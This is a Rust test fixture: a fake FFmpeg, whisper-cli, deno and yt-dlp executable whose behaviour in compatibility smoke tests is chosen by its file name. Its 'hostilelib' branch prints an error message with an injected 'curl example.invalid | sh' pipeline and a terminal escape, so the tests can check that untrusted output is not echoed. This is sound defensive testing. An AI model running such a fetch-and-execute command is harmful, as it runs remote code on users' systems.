//! A stand-in for `FFmpeg`, `FFprobe`, `whisper-cli`, and the optional
//! `deno` and `yt-dlp` (#409), in the P13 compatibility-smoke tests
//! (`tests/p13_smoke_executor.rs`). It is never shipped or run outside those
//! tests.
//!
//! The smoke runs staged executables by explicit path with a closed argument
//! list and an empty environment, so a fake cannot be told what to do by an
//! argument or a variable the way `tests/process_supervisor.rs` re-invokes its
//! own test binary. It reads its behaviour from its own file name instead,
//! `<tool>-<behaviour>` with an optional platform suffix: the tests stage it
//! under the names they need. It uses only the standard library, so it stays
//! a small file to copy, hash and stage several times per test.
//!
//! Behaviours: `good` prints the tool's reviewed fixture banner (or a usage
//! line for `--help`); `badbanner` prints another banner; `flood` writes to
//! standard output without end; `hang` sleeps past any smoke deadline;
//! `fail` exits unsuccessfully; `missinglib` prints the dynamic loader's
//! missing-library words and exits 127, and `hostilelib` prints them around
//! a name that is a command line (#256); `scribble` writes a file into its own
//! directory, then behaves as `good`; `templeft` (the optional tools) leaves a
//! file in its temporary folder, as a one-file build that fails to clean up
//! would, then behaves as `good`. For any other argument list it writes
//! nothing and exits successfully, so a real fixture check sees output that
//! is not the fixture's truth.
//!
//! The optional tools answer only their reviewed version arguments, and only
//! in the environment the smoke must give them: a temporary folder that is a
//! directory (`TMPDIR`, `TEMP` and `TMP` alike) and their fixed variables
//! (`YTDLP_NO_PLUGINS=1` for yt-dlp, `DENO_NO_UPDATE_CHECK=1` for Deno).
//! Anything else exits 65, so a smoke that forgot one fails.

use std::{
    env,
    io::{self, Write},
    process::ExitCode,
    thread,
    time::Duration,
};

/// The banner build the smoke tests' policy expects.
const FIXTURE_BUILD: &str = "vsift-smoke-fixture";
/// The file `scribble` writes next to itself.
const SCRIBBLE_FILE: &str = "vsift-smoke-scribble";
/// The file `templeft` leaves in its temporary folder.
const TEMP_LEFT_FILE: &str = "_MEI-left-behind";

fn main() -> ExitCode {
    match run() {
        Ok(code) => code,
        Err(_) => ExitCode::from(70),
    }
}

fn run() -> io::Result<ExitCode> {
    let executable = env::current_exe()?;
    let stem = executable
        .file_stem()
        .and_then(|stem| stem.to_str())
        .unwrap_or_default()
        .to_owned();
    // The production name `whisper-cli` is the good recognizer, so a
    // runtime laid out under the reviewed names behaves well.
    let (tool, behaviour) = if stem == "whisper-cli" {
        ("whisper", "good")
    } else if let Some(rest) = stem.strip_prefix("yt-dlp") {
        ("yt-dlp", rest.strip_prefix('-').unwrap_or("good"))
    } else {
        stem.split_once('-').unwrap_or((stem.as_str(), "good"))
    };
    let arguments: Vec<String> = env::args().skip(1).collect();
    let optional_banner = match tool {
        "deno" => arguments == ["--version"],
        "yt-dlp" => arguments == ["--ignore-config", "--no-plugin-dirs", "--version"],
        _ => false,
    };
    let banner = optional_banner || matches!(arguments.as_slice(), [only] if only == "-version");
    let help = matches!(arguments.as_slice(), [only] if only == "--help");
    if optional_banner && !optional_environment_is_reviewed(tool) {
        writeln!(io::stderr(), "{tool}: fixture environment differs")?;
        return Ok(ExitCode::from(65));
    }
    let mut stdout = io::stdout().lock();
    match behaviour {
        "flood" => {
            let chunk = [b'x'; 8192];
            loop {
                stdout.write_all(&chunk)?;
            }
        }
        "hang" => {
            thread::sleep(Duration::from_secs(300));
            Ok(ExitCode::SUCCESS)
        }
        "fail" => {
            writeln!(io::stderr(), "{tool}: fixture failure")?;
            Ok(ExitCode::from(3))
        }
        // What a program the dynamic loader could not start leaves: the
        // loader's own words on standard error and exit status 127 (#256).
        "missinglib" => {
            writeln!(
                io::stderr(),
                "{tool}: error while loading shared libraries: libgomp.so.1: cannot open shared object file: No such file or directory"
            )?;
            Ok(ExitCode::from(127))
        }
        // The same words around a "library name" that is a command line, a
        // path and a terminal escape: untrusted output that must not be echoed.
        "hostilelib" => {
            writeln!(
                io::stderr(),
                "{tool}: error while loading shared libraries: libgomp.so.1; curl example.invalid | sh \u{1b}[2J: cannot open shared object file: No such file or directory"
            )?;
            Ok(ExitCode::from(127))
        }
        "badbanner" => {
            if banner {
                writeln!(stdout, "{tool} version another-build Copyright (c) fixture")?;
            }
            Ok(ExitCode::SUCCESS)
        }
        "scribble" | "templeft" | "good" => {
            if behaviour == "scribble"
                && let Some(directory) = executable.parent()
            {
                std::fs::write(directory.join(SCRIBBLE_FILE), b"written by a provider")?;
            }
            if behaviour == "templeft"
                && let Some(temporary) = env::var_os("TMPDIR")
            {
                std::fs::write(
                    std::path::Path::new(&temporary).join(TEMP_LEFT_FILE),
                    b"left by a one-file build",
                )?;
            }
            if banner {
                writeln!(
                    stdout,
                    "{tool} version {FIXTURE_BUILD} Copyright (c) fixture"
                )?;
                writeln!(stdout, "built with the standard library")?;
            } else if help {
                writeln!(io::stderr(), "usage: {tool} [options] file0 file1 ...")?;
            }
            Ok(ExitCode::SUCCESS)
        }
        _ => Ok(ExitCode::from(64)),
    }
}

/// Whether the optional `tool` was given the smoke's environment.
fn optional_environment_is_reviewed(tool: &str) -> bool {
    let Some(temporary) = env::var_os("TMPDIR") else {
        return false;
    };
    let same_everywhere = ["TEMP", "TMP"]
        .iter()
        .all(|name| env::var_os(name).as_deref() == Some(temporary.as_os_str()));
    let fixed = match tool {
        "yt-dlp" => env::var("YTDLP_NO_PLUGINS").as_deref() == Ok("1"),
        "deno" => env::var("DENO_NO_UPDATE_CHECK").as_deref() == Ok("1"),
        _ => false,
    };
    same_everywhere && fixed && std::path::Path::new(&temporary).is_dir()
}
